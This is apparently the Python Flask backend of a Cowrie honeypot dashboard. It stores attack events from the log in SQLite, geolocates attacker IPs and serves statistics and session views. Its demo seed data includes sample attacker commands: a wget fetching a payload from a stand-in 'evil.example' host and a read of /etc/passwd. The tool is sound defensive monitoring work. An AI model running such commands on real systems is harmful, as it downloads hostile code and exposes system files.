import json
import logging
import os
import sqlite3
import threading
import time
from collections import Counter
from datetime import datetime, timedelta, timezone
from pathlib import Path

import requests
from dotenv import load_dotenv
from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS

load_dotenv()

BASE_DIR = Path(__file__).resolve().parent.parent
DATABASE_PATH = Path(os.getenv("DATABASE_PATH", str(BASE_DIR / "data" / "cowrie.db")))
LOG_PATH = Path(os.getenv("COWRIE_LOG_PATH", "/var/log/cowrie/cowrie.json"))
HOST = os.getenv("HOST", "0.0.0.0")
PORT = int(os.getenv("PORT", "5000"))
DEMO_MODE = os.getenv("DEMO_MODE", "0") == "1"
REFRESH_SECONDS = int(os.getenv("REFRESH_SECONDS", "15"))

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("cowrie-dashboard")
app = Flask(__name__, static_folder=str(BASE_DIR / "frontend"), static_url_path="")
CORS(app)

_db_lock = threading.Lock()
_geo_cache = {}


def db_connect():
    DATABASE_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(DATABASE_PATH, timeout=30)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    return conn


def init_db():
    with db_connect() as conn:
        conn.executescript("""
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            eventid TEXT,
            src_ip TEXT,
            timestamp TEXT,
            username TEXT,
            password TEXT,
            input TEXT,
            session TEXT,
            raw_json TEXT NOT NULL,
            inserted_at TEXT NOT NULL,
            UNIQUE(eventid, timestamp, session, src_ip, input)
        );
        CREATE INDEX IF NOT EXISTS idx_events_timestamp ON events(timestamp);
        CREATE INDEX IF NOT EXISTS idx_events_session ON events(session);
        CREATE INDEX IF NOT EXISTS idx_events_src_ip ON events(src_ip);
        """)


def parse_timestamp(value):
    if not value:
        return datetime.now(timezone.utc)
    text = str(value).replace("Z", "+00:00")
    try:
        parsed = datetime.fromisoformat(text)
        return parsed if parsed.tzinfo else parsed.replace(tzinfo=timezone.utc)
    except ValueError:
        return datetime.now(timezone.utc)


def insert_event(event):
    payload = {
        "eventid": event.get("eventid", ""),
        "src_ip": event.get("src_ip", "unknown"),
        "timestamp": parse_timestamp(event.get("timestamp")).isoformat(),
        "username": event.get("username", ""),
        "password": event.get("password", ""),
        "input": event.get("input", ""),
        "session": event.get("session", ""),
        "raw_json": json.dumps(event, ensure_ascii=False),
        "inserted_at": datetime.now(timezone.utc).isoformat(),
    }
    with _db_lock, db_connect() as conn:
        cur = conn.execute("""
            INSERT OR IGNORE INTO events
            (eventid, src_ip, timestamp, username, password, input, session, raw_json, inserted_at)
            VALUES (:eventid, :src_ip, :timestamp, :username, :password, :input, :session, :raw_json, :inserted_at)
        """, payload)
        return cur.rowcount == 1


def seed_demo():
    now = datetime.now(timezone.utc)
    samples = [
        ("203.0.113.44", "root", "123456", "uname -a", "demo-a"),
        ("198.51.100.19", "admin", "admin", "wget http://evil.example/payload", "demo-b"),
        ("192.0.2.77", "root", "toor", "cat /etc/passwd", "demo-c"),
        ("203.0.113.44", "root", "123456", "ls -la", "demo-a"),
        ("198.51.100.19", "ubuntu", "password", "whoami", "demo-b"),
    ]
    for i, (ip, user, password, command, session) in enumerate(samples):
        insert_event({"eventid": "cowrie.command.input", "src_ip": ip,
                      "timestamp": (now - timedelta(minutes=i * 7)).isoformat(),
                      "username": user, "password": password, "input": command, "session": session})


def tail_log():
    if not LOG_PATH.exists():
        log.warning("Cowrie log not found at %s", LOG_PATH)
        if DEMO_MODE:
            seed_demo()
        return
    log.info("Following Cowrie log: %s", LOG_PATH)
    with LOG_PATH.open("r", encoding="utf-8", errors="replace") as handle:
        handle.seek(0, os.SEEK_END)
        while True:
            line = handle.readline()
            if not line:
                time.sleep(1)
                continue
            try:
                event = json.loads(line)
                insert_event(event)
            except json.JSONDecodeError:
                log.warning("Ignoring malformed JSON line")
            except Exception:
                log.exception("Unable to store event")


def start_ingester():
    threading.Thread(target=tail_log, name="cowrie-log-ingester", daemon=True).start()


def rows_as_dict(rows):
    return [dict(row) for row in rows]


def geo_for(ip):
    if not ip or ip in ("unknown", "127.0.0.1", "::1"):
        return {"country": "Local", "country_code": "LO", "lat": 0, "lon": 0}
    if ip in _geo_cache:
        return _geo_cache[ip]
    try:
        result = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,lat,lon", timeout=2).json()
        if result.get("status") == "success":
            geo = {"country": result.get("country", "Unknown"), "country_code": result.get("countryCode", "??"),
                   "lat": result.get("lat"), "lon": result.get("lon")}
        else:
            geo = {"country": "Unknown", "country_code": "??", "lat": None, "lon": None}
    except requests.RequestException:
        geo = {"country": "Unknown", "country_code": "??", "lat": None, "lon": None}
    _geo_cache[ip] = geo
    return geo


def query_count(sql, params=()):
    with db_connect() as conn:
        return conn.execute(sql, params).fetchone()[0]


@app.get("/")
def index():
    return send_from_directory(app.static_folder, "index.html")


@app.get("/api/config")
def config():
    return jsonify({"refresh_seconds": REFRESH_SECONDS, "log_path": str(LOG_PATH), "demo_mode": DEMO_MODE})


@app.get("/api/stats")
def stats():
    since_24h = (datetime.now(timezone.utc) - timedelta(hours=24)).isoformat()
    with db_connect() as conn:
        total = conn.execute("SELECT COUNT(*) FROM events").fetchone()[0]
        ips = conn.execute("SELECT COUNT(DISTINCT src_ip) FROM events WHERE src_ip != ''").fetchone()[0]
        commands = conn.execute("SELECT COUNT(*) FROM events WHERE eventid LIKE '%command%' OR input != ''").fetchone()[0]
        uploads = conn.execute("SELECT COUNT(*) FROM events WHERE eventid LIKE '%upload%' OR eventid LIKE '%file%' ").fetchone()[0]
        last_24h = conn.execute("SELECT COUNT(*) FROM events WHERE timestamp >= ?", (since_24h,)).fetchone()[0]
    return jsonify({"total_attempts": total, "unique_ips": ips, "commands": commands, "malware_uploads": uploads, "last_24h": last_24h})


@app.get("/api/recent-sessions")
def recent_sessions():
    limit = min(max(request.args.get("limit", 20, type=int), 1), 100)
    with db_connect() as conn:
        rows = conn.execute("""
            SELECT session, src_ip, MIN(timestamp) AS started_at, MAX(timestamp) AS last_seen,
                   MAX(username) AS username, MAX(password) AS password,
                   COUNT(*) AS event_count,
                   GROUP_CONCAT(NULLIF(input, ''), ' || ') AS commands
            FROM events
            GROUP BY session, src_ip
            ORDER BY last_seen DESC LIMIT ?
        """, (limit,)).fetchall()
    result = []
    for row in rows:
        item = dict(row)
        item["commands"] = (item.get("commands") or "").split(" || ") if item.get("commands") else []
        item.update(geo_for(item["src_ip"]))
        result.append(item)
    return jsonify(result)


@app.get("/api/sessions/<session_id>")
def session_detail(session_id):
    with db_connect() as conn:
        rows = conn.execute("SELECT * FROM events WHERE session = ? ORDER BY timestamp ASC", (session_id,)).fetchall()
    if not rows:
        return jsonify({"error": "Session not found"}), 404
    events = rows_as_dict(rows)
    for event in events:
        try:
            event["raw"] = json.loads(event.pop("raw_json"))
        except json.JSONDecodeError:
            event["raw"] = {}
    return jsonify({"session": session_id, "src_ip": events[0]["src_ip"], "geo": geo_for(events[0]["src_ip"]), "events": events})


@app.get("/api/top-attackers")
def top_attackers():
    with db_connect() as conn:
        attackers = rows_as_dict(conn.execute("SELECT src_ip AS label, COUNT(*) AS count FROM events GROUP BY src_ip ORDER BY count DESC LIMIT 10").fetchall())
        credentials = rows_as_dict(conn.execute("SELECT username || ' / ' || password AS label, COUNT(*) AS count FROM events WHERE username != '' OR password != '' GROUP BY username, password ORDER BY count DESC LIMIT 10").fetchall())
        commands = rows_as_dict(conn.execute("SELECT input AS label, COUNT(*) AS count FROM events WHERE input != '' GROUP BY input ORDER BY count DESC LIMIT 10").fetchall())
    return jsonify({"attackers": attackers, "credentials": credentials, "commands": commands})


@app.get("/api/timeline")
def timeline():
    hours = min(max(request.args.get("hours", 24, type=int), 1), 24 * 7)
    since = datetime.now(timezone.utc) - timedelta(hours=hours)
    with db_connect() as conn:
        rows = conn.execute("""
            SELECT substr(timestamp, 1, 13) AS bucket, COUNT(*) AS count
            FROM events WHERE timestamp >= ? GROUP BY bucket ORDER BY bucket
        """, (since.isoformat(),)).fetchall()
    return jsonify(rows_as_dict(rows))


@app.get("/api/map-points")
def map_points():
    with db_connect() as conn:
        ips = [row[0] for row in conn.execute("SELECT src_ip FROM events GROUP BY src_ip ORDER BY MAX(timestamp) DESC LIMIT 100").fetchall()]
        counts = {row[0]: row[1] for row in conn.execute("SELECT src_ip, COUNT(*) FROM events GROUP BY src_ip").fetchall()}
    points = []
    for ip in ips:
        geo = geo_for(ip)
        if geo.get("lat") is not None:
            points.append({"ip": ip, "count": counts.get(ip, 0), **geo})
    return jsonify(points)


init_db()
start_ingester()

if __name__ == "__main__":
    app.run(host=HOST, port=PORT, debug=False, threaded=True)
